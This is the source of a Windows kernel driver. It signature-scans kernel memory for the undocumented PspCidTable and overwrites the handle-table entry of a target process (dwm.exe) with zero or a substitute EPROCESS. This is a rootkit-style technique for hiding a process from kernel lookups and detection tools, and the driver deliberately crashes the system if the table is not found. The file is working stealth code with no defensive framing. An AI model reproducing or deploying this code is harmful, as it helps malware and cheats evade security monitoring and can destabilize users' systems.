#include "utils/utils.h"

ULONG64 SearchPspCidTable(ULONG64 pagestart, ULONG64 pageend) {
	BYTE PspCidTableCode[] = { 0x66,0xFF,0x89,0xE6,0x01,0x00,0x00,0x49,0x8B,0xF0,0x48,0x8B,0xF9 };

	ULONG64 Address = (ULONG64)HideMmSearchMemory((PVOID)pagestart, pageend - pagestart, PspCidTableCode, sizeof(PspCidTableCode));
	if (Address != 0) {
		Address = Address + 13;
		ULONG OffSet = *(PULONG)(Address + 3);
		OffSet = (ULONG)Address + OffSet + 7;

		Address = (Address & 0xFFFFFFFF00000000) + OffSet;
		Address = *(PULONG64)Address;
	}
	return Address;
}

VOID HideSearch(PULONG64 pPspCidTable)
{
	ULONG_PTR pagestart = 0;
	ULONG_PTR pageend = 0;

	ULONG_PTR kernelbase = (ULONG_PTR)GetKernelBaseAddr();

	if (!kernelbase)
	{
		return;
	}

	PIMAGE_NT_HEADERS pHdr = RtlImageNtHeader((PVOID)kernelbase);

	if (!pHdr)
	{
		return;
	}

	PIMAGE_SECTION_HEADER pFirstSection = (PIMAGE_SECTION_HEADER)(pHdr + 1);

	for (PIMAGE_SECTION_HEADER pSection = pFirstSection; pSection < pFirstSection + pHdr->FileHeader.NumberOfSections; pSection++)
	{
		if (_stricmp((char*)pSection->Name, ".text") == 0) {
			pagestart = kernelbase + pSection->VirtualAddress;
			pageend = kernelbase + pSection->VirtualAddress + pSection->Misc.VirtualSize;
			if (*pPspCidTable == 0) {
				*pPspCidTable = SearchPspCidTable(pagestart, pageend);
			}
		}

		if (_stricmp((char*)pSection->Name, "PAGE") == 0) {
			pagestart = kernelbase + pSection->VirtualAddress;
			pageend = kernelbase + pSection->VirtualAddress + pSection->Misc.VirtualSize;
			if (*pPspCidTable == 0) {
				*pPspCidTable = SearchPspCidTable(pagestart, pageend);
			}

		}
	}
	if (!pagestart)
	{
		return;
	}

	return;
}

VOID SetPspCidTable(ULONG64 Pid, ULONG64 eprocess)
{

	ULONG64 PspCidTable = 0;

	HideSearch(&PspCidTable);

	if (PspCidTable == 0) {
		KeBugCheckEx(0, 0, 0, 0, 0);
	}

	PULONG64 handle_table_entry = (PULONG64)ExpLookupHandleTableEntry((PVOID)PspCidTable, Pid);

	/* PspReferenceCidTableEntry
	if ( !(unsigned __int8)ExLockHandleTableEntry(PspCidTable, v4) )
	  return 0i64;

	v11 = (struct _DMA_ADAPTER *)((*(__int64 *)v4 >> 0x10) & 0xFFFFFFFFFFFFFFF0ui64);
	*/

	/* windbg dump
	2: kd> $$>a< C:\scripts\CheckPspCidTable 100
	Case 1.
	ffffe30d`a8ab0060  a48a7bb3`90400001

	a48a7bb3`90400001 >> 0x10 = EPROCESS
	EPROCESS << 0x10 | 0x01 = a48a7bb3`90400001
	*/

	if (eprocess)
		*handle_table_entry = eprocess << 0x10 | 0x01;
	else
		*handle_table_entry = 0;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPat)
{
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPat);

	PEPROCESS eprocess;
	HANDLE pid;
	if (FindProcessByName("dwm.exe", &eprocess))
	{
		pid = GetProcessId(eprocess);

		DbgPrint("PID : %d\n", pid);
		DbgPrint("EPROCESS : 0x%p\n", eprocess);

		// Null Process
		SetPspCidTable((ULONG64)pid, (ULONG64)NULL);

		/*
		
		// Dummy Process
		PEPROCESS dummy_process;
		SetPspCidTable((ULONG64)pid, (ULONG64)dummy_process);

		// Original Process
		PEPROCESS original_process;
		SetPspCidTable((ULONG64)pid, (ULONG64)original_process);

		*/
	}
	return STATUS_UNSUCCESSFUL;
}